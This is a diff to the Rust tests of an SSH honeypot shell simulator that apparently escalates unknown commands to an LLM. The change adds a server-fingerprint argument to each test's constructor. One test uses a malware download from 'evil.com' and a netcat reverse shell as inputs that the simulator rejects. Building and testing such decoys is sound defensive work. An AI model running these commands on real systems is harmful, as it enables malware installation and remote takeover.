@@ -4,6 +4,11 @@ mod tests {
     use crate::protocols::ssh_shell::SshShellSimulator;
     use crate::protocols::LlmEscalationConfig;
     use crate::chatgpt::ChatService;
+    use crate::fingerprint::ServerFingerprint;
+
+    fn test_fingerprint() -> ServerFingerprint {
+        ServerFingerprint::default_static()
+    }
 
     // Mock ChatService for testing
     #[derive(Clone)]
@@ -24,7 +29,7 @@ mod tests {
             response: "mock response".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let simulator = SshShellSimulator::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         assert_eq!(simulator.username, "root");
         assert_eq!(simulator.hostname, "ubuntu-server");
@@ -37,7 +42,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let simulator = SshShellSimulator::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         assert!(simulator.is_known_command("ls"));
         assert!(simulator.is_known_command("pwd"));
@@ -51,7 +56,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let simulator = SshShellSimulator::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         assert!(simulator.is_known_command("cd /tmp"));
         assert!(simulator.is_known_command("cd .."));
@@ -64,7 +69,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let simulator = SshShellSimulator::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         assert!(simulator.is_known_command("cat /etc/passwd"));
         assert!(simulator.is_known_command("cat somefile.txt"));
@@ -76,7 +81,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let simulator = SshShellSimulator::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         assert!(!simulator.is_known_command("wget http://evil.com/malware"));
         assert!(!simulator.is_known_command("nc -e /bin/sh 1.2.3.4 443"));
@@ -88,7 +93,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let mut simulator = SshShellSimulator::new(mock_chat, config);
+        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         let response = simulator.get_native_response("ls");
         assert!(response.is_some());
@@ -101,7 +106,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let mut simulator = SshShellSimulator::new(mock_chat, config);
+        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         let response = simulator.get_native_response("pwd");
         assert!(response.is_some());
@@ -114,7 +119,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let mut simulator = SshShellSimulator::new(mock_chat, config);
+        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         let response = simulator.get_native_response("whoami");
         assert!(response.is_some());
@@ -127,7 +132,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let mut simulator = SshShellSimulator::new(mock_chat, config);
+        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         assert_eq!(simulator.current_dir, "/root");
 
@@ -146,7 +151,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let mut simulator = SshShellSimulator::new(mock_chat, config);
+        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         let response = simulator.get_native_response("unknown_command");
         assert!(response.is_none());
@@ -158,7 +163,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let simulator = SshShellSimulator::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         let prompt = simulator.get_prompt();
         assert_eq!(prompt, "root@ubuntu-server:/root# ");
@@ -170,7 +175,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let mut simulator = SshShellSimulator::new(mock_chat, config);
+        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         simulator.set_username("attacker".to_string());
         assert_eq!(simulator.username, "attacker");
@@ -183,7 +188,7 @@ mod tests {
             response: "".to_string(),
         };
         let config = LlmEscalationConfig::default();
-        let simulator = SshShellSimulator::new(mock_chat, config);
+        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());
 
         assert!(simulator.is_exit_command("exit"));
         assert!(simulator.is_exit_command("quit"));
